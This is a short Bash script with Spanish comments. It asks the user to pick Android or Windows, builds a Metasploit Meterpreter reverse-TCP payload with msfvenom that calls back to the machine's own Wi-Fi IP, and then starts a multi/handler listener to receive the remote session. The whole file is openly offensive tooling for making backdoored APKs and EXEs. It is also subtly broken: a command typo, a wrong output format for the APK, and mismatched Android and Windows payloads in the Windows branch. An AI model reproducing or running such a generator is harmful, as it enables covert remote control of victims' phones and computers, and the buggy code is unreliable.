#!bin/bash

ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)


echo "(1) Android  <evil APK> = test.apk"
echo "(2) Windows  <exe backdoored> = test.exe"

exe='2'
apk='1'

 
 read x

if [ "$x" == "$apk" ]; then   #alguien mira esto?
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/sdcard/payload.apk
eho -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Listo mirrey en /root/sdcard/payload.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

preparando el handler..........

'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip ; set lport 4444 ; exploit ;"

#necesito estabilidad emocional, efren siempre se mi amigo porfavor

elif [ "$x" == "$exe" ]; then
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/sdcard/payload.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!listisimo guero en /root/sdcard/payload.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

preparando las manitas..............

'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost$ip ; set lport 4444 ; exploit ;"